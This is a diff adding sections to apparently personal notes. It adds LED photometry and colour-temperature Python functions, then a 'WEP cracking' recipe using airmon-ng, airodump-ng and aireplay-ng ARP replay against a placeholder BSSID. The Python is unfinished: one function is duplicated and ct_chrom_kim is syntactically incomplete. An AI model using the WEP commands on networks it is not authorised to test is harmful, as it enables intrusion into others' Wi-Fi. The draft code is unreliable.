@@ -1271,3 +1271,55 @@ print(collect()) # Nothing
 
 gui
 editor with vim keys
+
+= LEDs
+
+from math import (pi, cos)
+
+def deg_rad(deg):
+    return deg / 180 * pi
+
+def deg_sr(deg):
+    return 2 * pi * (1 - cos(deg_rad(deg) / 2))
+
+def mcd_lm(mcd, deg):
+    return mcd * 10 ** -3 * deg_sr(deg)
+
+def chrom_cct_mccamy(chrom):
+    e = [0.3320, 0.1858]
+    n = (chrom[0] - e[0]) / (chrom[1] - e[1])
+    return -449 * n ** 3 + 3525 * n ** 2 - 6823.3 * n + 5520.33
+
+def chrom_cct_mccamy(chrom):
+    e = [0.3320, 0.1858]
+    n = (chrom[0] - e[0]) / (chrom[1] - e[1])
+    return -449 * n ** 3 + 3525 * n ** 2 - 6823.3 * n + 5520.33
+
+from math import exp
+
+def chrom_cct_jha_low(chrom):
+    e = [0.3320, 0.1858]
+    A_0 = -949.86315
+    A = [6253.80338, 28.70599, 0.00004]
+    t = [0.92159, 0.20039, 0.07125]
+    
+    n = (chrom[0] - e[0]) / (chrom[1] - e[1])
+    return A_0 + sum(A[i] * exp(-n * t[i]) for i in range(3))
+
+def ct_chrom_kim(T):
+    x = \
+        -0.2661239e9 / T ** 3 - 0.2343580e6 / T ** 2 + 0.8776956e3 / T + 0.179910 if 1667 <= T < 4000 else \
+        -3.0258469e9 / T ** 3 + 2.1070379e6 / T ** 2 + 0.2226347e3 / T + 0.240390 if 4000 <= T <= 25000
+    y = \
+        
+AL-103W2C-004 10 mm 30 mA 80 mW 2.8–3.6 V 3500–6500 mcd 30° 0.75–1.39 lm chrom. (0.25,0.26) 17000 K 1000 h
+
+= WEP cracking
+
+sudo airmon-ng start wifi 11
+sudo airodump-ng --write <name> --showack wifi --channel 11 --ivs --bssid AA:BB:CC:DD:EE:FF
+-x msec?
+sudo aireplay-ng wifi -3 -b AA:BB:CC:DD:EE:FF -e <string>
+                         KEY FOUND! [ xx:xx:xx:xx:xx ] 
+
+= Arch installation
